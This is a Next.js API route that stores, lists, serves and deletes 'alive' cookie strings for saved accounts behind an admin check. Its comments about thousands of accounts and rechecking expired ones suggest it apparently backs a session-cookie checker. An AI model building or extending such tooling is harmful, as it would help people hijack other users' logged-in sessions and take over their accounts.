import { type NextRequest, NextResponse } from "next/server"
import { isAdminAuthenticated } from "@/lib/admin-auth"
import { isAliveResult } from "@/lib/cookie-utils"
import {
  type AliveEntry,
  clearSavedCookies,
  deleteSavedCookie,
  listSavedCookieDetails,
  loadSavedCookiesByIds,
  removeSavedCookies,
  saveAliveCookies,
} from "@/lib/saved-cookies"
import { dbEnabled } from "@/lib/db"

export const runtime = "nodejs"

// All saved-cookie operations are admin-only. The same HMAC session cookie that
// gates /admin protects these endpoints.
async function requireAdmin(): Promise<NextResponse | null> {
  if (!(await isAdminAuthenticated())) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
  }
  if (!dbEnabled) {
    return NextResponse.json({ error: "Database is not configured." }, { status: 503 })
  }
  return null
}

const MAX_COOKIE_LEN = 8_192

// GET — two modes:
//   (default)        → list saved accounts WITHOUT cookie blobs (lightweight; this
//                      is what the dashboard loads on every visit).
//   ?cookies=1,2,3   → return the full cookie strings for just those ids, fetched
//                      on demand when the operator copies / downloads / rechecks.
// Splitting it this way keeps passive dashboard loads tiny (no multi-KB blobs) so
// data transfer stays low even with thousands of saved accounts.
export async function GET(req: NextRequest) {
  const denied = await requireAdmin()
  if (denied) return denied

  const cookiesParam = new URL(req.url).searchParams.get("cookies")
  if (cookiesParam !== null) {
    const ids = cookiesParam.split(",").map((s) => s.trim()).filter(Boolean)
    if (ids.length === 0) return NextResponse.json({ cookies: [] })
    const rows = await loadSavedCookiesByIds(ids)
    return NextResponse.json({ cookies: rows.map((r) => ({ id: r.id, cookie: r.cookie })) })
  }

  const items = await listSavedCookieDetails()
  return NextResponse.json({ items })
}

// POST — persist alive cookies. Body: { items: [{ cookie, result }] }.
// Non-alive results are ignored server-side as a safety net.
export async function POST(req: NextRequest) {
  const denied = await requireAdmin()
  if (denied) return denied

  let body: { items?: AliveEntry[] }
  try {
    body = await req.json()
  } catch {
    return NextResponse.json({ error: "Invalid request body." }, { status: 400 })
  }

  const incoming = Array.isArray(body.items) ? body.items : []
  const entries = incoming
    .filter((e) => e && typeof e.cookie === "string" && e.result && isAliveResult(e.result))
    .map((e) => ({ cookie: e.cookie.slice(0, MAX_COOKIE_LEN), result: e.result }))

  if (entries.length === 0) return NextResponse.json({ saved: 0 })

  const { saved } = await saveAliveCookies(entries)
  return NextResponse.json({ saved })
}

// DELETE — remove one (?id=) or all (?all=true) saved cookies.
export async function DELETE(req: NextRequest) {
  const denied = await requireAdmin()
  if (denied) return denied
  const { isAdministrator } = await import("@/lib/admin-auth")
  if (!(await isAdministrator())) return NextResponse.json({ error: "Administrator access required." }, { status: 403 })

  const { searchParams } = new URL(req.url)
  if (searchParams.get("all") === "true") {
    const removed = await clearSavedCookies()
    return NextResponse.json({ removed })
  }

  // Batch delete: a JSON body of { ids: [...] } prunes many accounts in one
  // round-trip. Used by the fast client-side recheck to drop expired accounts.
  if (req.headers.get("content-type")?.includes("application/json")) {
    const body = (await req.json().catch(() => null)) as { ids?: unknown } | null
    const ids = Array.isArray(body?.ids) ? body!.ids.filter((v): v is string => typeof v === "string") : []
    if (ids.length > 0) {
      const removed = await removeSavedCookies(ids)
      return NextResponse.json({ removed })
    }
    return NextResponse.json({ removed: 0 })
  }

  const id = searchParams.get("id")
  if (!id) return NextResponse.json({ error: "Missing id." }, { status: 400 })
  const ok = await deleteSavedCookie(id)
  return NextResponse.json({ removed: ok ? 1 : 0 })
}
